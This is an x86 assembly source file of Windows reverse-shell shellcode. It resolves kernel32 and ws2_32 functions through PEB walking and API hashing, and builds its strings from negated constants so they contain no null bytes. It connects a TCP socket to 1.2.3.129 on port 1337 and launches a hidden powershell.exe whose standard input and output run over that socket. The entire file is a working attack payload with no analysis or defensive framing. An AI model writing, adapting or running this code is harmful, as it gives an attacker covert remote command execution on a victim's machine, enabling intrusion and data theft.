uwu:
    ; create a new stack frame
    push ebp
    mov ebp, esp
    add esp, 0xfffff9b8         ; Allocate space for local variables (0x648 bytes) by adding (-0x648) to esp

    ; Get kernel32.dll base address
    xor eax, eax
    mov ebx, [fs:0x30 + eax]    ; PEB
    mov ebx, [ebx + 0x0C]       ; PEB_LDR_DATA
    mov ebx, [ebx + 0x14]       ; InMemoryOrderModuleList (first entry)
    mov ebx, [ebx]              ; Flink (ntdll.dll)
    mov ebx, [ebx]              ; Flink (kernel32.dll)
    mov ebx, [ebx + 0x10]       ; BaseAddress
    
    jmp uwu.load

    .search:
        mov esi, [ebp - 0xC]    ; Name Pointer Table addr.
        cmp ecx, [ebp - 0x4]    ; compare counter with number of exported functions
        jz uwu.none             ; if counter == number of exported functions, jump to none

        ; get RVA of n'th entry in Name Pointer Table
        inc ecx             ; increment counter
        mov esi, [esi + ecx * 0x4]
        add esi, ebx        ; get addr. of n'th entry

        xor eax, eax        ; clear eax
        cdq                 ; Zero out edx
        cld                 ; Clear direction flag to read strings left to right
        
        .hash:
            lodsb           ; Load byte at address DS:ESI into AL, increment ESI
            test al, al     ; test for null byte
            jz uwu.compare  ; if null byte, move to comparing the hash
            ror edx, 0xD    ; rotate right by 13 bits
            add edx, eax    ; add the current byte to the hash
            jmp uwu.hash    ; continue hashing
        
        .none:
            xor eax, eax    ; clear eax
            ret             ; return 0 if function not found

    .compare:
        cmp edx, [esp + 0x4]    ; compare the computed hash with pushed hash
        jnz uwu.search          ; if not equal, move to next entry
        
        mov edx, [ebp - 0x10]   ; get Ordinal Table addr.
        ; Extrapolate Ordinal Number into eax (Ordinal Base + Position * Bytes in Each Entry)
        movzx eax, word [edx + ecx * 0x02]

        mov edx, [ebp - 0x8]    ; get Address Table addr.
        ; Capture the RVA into eax (Address Table base + Ordinal Number * Bytes in Each Entry)
        mov eax, [edx + eax * 0x04]

        add eax, ebx            ; get actual address of function by adding to shell32 base
        ret


    .resSym:         
        ; look for address of Address Table, Name Pointer Table & Ordinal Table in SHELL32.dll
        mov eax, [ebx + 0x3C]   ; PE Signature RVA (base + 0x3C)
        add eax, ebx            ; PE Signature addr.
        mov eax, [eax + 0x78]   ; Export Table RVA (PE addr. + 0x78)
        add eax, ebx            ; Export Table addr.

        mov ecx, [eax + 0x14]   ; Number of exported functions
        mov [ebp - 0x4], ecx    ; Store number of exported functions in var 4

        mov edx, [eax + 0x1C]   ; RVA of Address Table (Export Table addr. + 0x1C)
        add edx, ebx            ; Addr. of Address Table
        mov [ebp - 0x8], edx    ; Store Address Table addr. in var 8

        mov ecx, [eax + 0x20]   ; RVA of Name Pointer Table (Export Table addr. + 0x20)
        add ecx, ebx            ; Addr. of Name Pointer Table
        mov [ebp - 0xC], ecx    ; Store Name Pointer Table addr. in var C

        mov ecx, [eax + 0x24]   ; RVA of Ordinal Table (Export Table addr. + 0x24)
        add ecx, ebx            ; Addr. of Ordinal Table
        mov [ebp - 0x10], ecx   ; Store Ordinal Table addr. in var 10
        ret

    
    ; LoadLibraryA("ws2_32.dll")
    .load:
        call uwu.resSym         ; resolve symbols/table addresses for kernel32.dll
        
        push 0xec0e4e8e         ; hash of "LoadLibraryA"
        xor ecx, ecx            ; clear ecx for counter
        call uwu.search         ; search for "LoadLibraryA"
        mov [ebp + 0x8], eax    ; store the address of LoadLibraryA in ebpVar8

        push 0x16b3fe72         ; hash of CreateProcessA
        xor ecx, ecx            ; clear ecx for counter
        call uwu.search         ; search for CreateProcessA
        mov [ebp + 0xC], eax    ; store the address of CreateProcessA in ebpVarC

        push 0x7f9e1144         ; hash of SetHandleInformation
        xor ecx, ecx            ; clear ecx for counter
        call uwu.search         ; search for SetHandleInformation
        mov [ebp + 0x20], eax   ; store the address of SetHandleInformation in ebpVar10
        
        xor eax, eax            ; clear eax
        mov eax, 0xffff9394
        neg eax
        push eax
        mov eax, 0x9bd1cdcd
        neg eax
        push eax
        mov eax, 0xa0cd8c89
        neg eax
        push eax
        push esp                ;  &("ws2_32.dll")
        call dword [ebp + 0x8]  ; LoadLibraryA("ws2_32.dll")

        mov ebx, eax            ; replace kernel32 base with ws2_32 base
        call uwu.resSym         ; resolve symbols/table addresses for ws2_32.dll

        push 0x3bfcedcb         ; hash of "WSAStartup"
        xor ecx, ecx            ; clear ecx for counter
        call uwu.search         ; search for "WSAStartup"
        mov [ebp + 0x14], eax    ; store the address of WSAStartup in ebpVar14

        push 0xadf509d9         ; hash of "WSASocketA"
        xor ecx, ecx            ; clear ecx for counter
        call uwu.search         ; search for "WSASocketA"
        mov [ebp + 0x18], eax   ; store the address of WSASocketA in ebpVar18

        push 0x60aaf9ec         ; hash of "connect"
        xor ecx, ecx            ; clear ecx for counter
        call uwu.search         ; search for "connect"
        mov [ebp + 0x1C], eax   ; store the address of connect in ebpVar1C

        ; push 0x9f5b7976         ; hash of "WSAGetLastError"
        ; xor ecx, ecx            ; clear ecx for counter
        ; call uwu.search         ; search for "WSAGetLastError"
        ; mov [ebp + 0x28], eax   ; store the address of WSAGetLastError in ebpVar28

        
    .goodStuff:
        ; WSAStartup
        xor eax, eax
        push eax                ; Create space for WSAData
        push esp                ; &WSAData Structure
        mov ax, 0x0202
        push eax                ; WSA Version [0x202 (2.2)]
        call dword [ebp + 0x14] ; WSAStartup(0x202, &WSAData)

        ; WSASocketA
        xor eax, eax
        push eax                ; dwFlags [0]
        push eax                ; lpProtocolInfo [NULL]
        push eax                ; g [0]
        mov al, 0x06
        push eax                ; protocol [6] (TCP)
        mov al, 0x01
        push eax                ; type [1] (SOCK_STREAM)
        mov al, 0x02
        push eax                ; af [2] (AF_INET)
        call dword [ebp + 0x18] ; WSASocketA(2, 1, 6, 0, NULL, 0)

        mov esi, eax            ; store socket in esi

        ; sockaddr_in struct
        xor eax, eax
        push eax                ; sin_zero (padding) 4 bytes
        push eax                ; sin_zero (padding) 4 bytes
        mov eax, 0x7efcfdff
        neg eax
        push eax                ; &sockaddr_in.sin_addr [0x01020381 (1.2.3.129)]
        ; to push the IP you split each octet individually and reverse them for LE 
        ; 0x81030201 -> 0x01020381 -> [1-01].[2-02].[3-03].[129-81]
        mov eax, 0xffffc6fb     ; 2's complement of 0x3905, BE -> 0x05 0x39 (1337)
        neg eax                 ; sin_port [1337]
        shl eax, 0x10           ; shift left 16 bits to make space for sin_family
        add al, 0x02            ; sin_family [2] (AF_INET)
        push eax                ; both sin_port and sin_family are 2 bytes each
        push esp                ; &sockaddr_in
        pop edi                 ; store &sockaddr_in in edi

        ; connect
        xor eax, eax
        mov al, 0x10            ; sinzero [8] + sin_addr [4] + sin_port [2] + sin_family [2] = 16 bytes
        push eax                ; namelen [24]
        push edi                ; &sockaddr_in
        push esi                ; socket s
        call dword [ebp + 0x1C] ; connect(s, &sockaddr_in, 24)

        ; SetHandleInformation
        xor eax, eax
        mov al, 0x3             ; HANDLE_FLAG_INHERIT = 0x1, HANDLE_FLAG_PROTECT_FROM_CLOSE = 0x2
        push eax                ; dwFlags
        push eax                ; dwMask
        push esi                ; hObject
        call dword [ebp + 0x10] ; SetHandleInformation(s, HANDLE_FLAG_INHERIT, 0x3)

        ; STARTUPINFOA struct
        push esi                ; hStdError
        push esi                ; hStdOutput
        push esi                ; hStdInput
        xor eax, eax
        push eax                ; lpReserved2
        push eax                ; cbReserved2 & wShowWindow
        mov al, 0xFF
        inc eax
        push eax                ; dwFlags
        xor eax, eax
        push eax                ; dwFillAttribute
        push eax                ; dwYCountChars
        push eax                ; dwXCountChars
        push eax                ; dwYSize
        push eax                ; dwXSize
        push eax                ; dwY
        push eax                ; dwX
        push eax                ; lpTitle
        push eax                ; lpDesktop
        push eax                ; lpReserved
        mov al, 0x44            ; size = 68 bytes
        ; Handles (12) + CRT Reserved (6) + Show Window (2) + Flags (4) + WindowPos (16) + Title (4) + Desktop (4) + Reserved (4)
        push eax                ; cb
        push esp                ; &STARTUPINFOA
        pop edi                 ; store &STARTUPINFOA in edi

        ; CommandLine
        mov eax, 0xffff9a88
        neg eax
        push eax
        mov eax, 0x9ad19394
        neg eax
        push eax
        mov eax, 0x9a978c8e
        neg eax
        push eax
        mov eax, 0x9a889090
        neg eax
        push eax
        push esp                ; &("powershell.exe")
        pop ebx                 ; store &("powershell") in ebx

        ; CreateProcessA
        xor eax, eax
        xor ecx, ecx
        mov eax, esp
        mov cl, 0x10            ; size of PROCESS_INFORMATION struct
        sub eax, ecx            ; Create space for the struct
        push eax
        push edi                ; lpStartupInfo
        xor eax, eax
        push eax                ; lpCurrentDirectory
        push eax                ; lpEnvironment
        mov eax, 0x7FFFFFF
        inc eax
        push eax                ; dwCreationFlags (CREATE_NO_WINDOW)
        xor eax, eax
        inc eax                 ; Set TRUE (1)
        push eax                ; bInheritHandles
        dec eax                 ; Null it again
        push eax                ; lpThreadAttributes
        push eax                ; lpProcessAttributes
        push ebx                ; lpCommandLine
        push eax                ; lpApplicationName
        call dword [ebp + 0xC]  ; CreateProcessA(NULL, "powershell.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &STARTUPINFOA, &PROCESS_INFORMATION)
        
    .done:
        xor eax, eax
        sub esp, 0xfffff9b8     ; deallocate local variables
        pop ebp                 ; restore ebp
        ret
        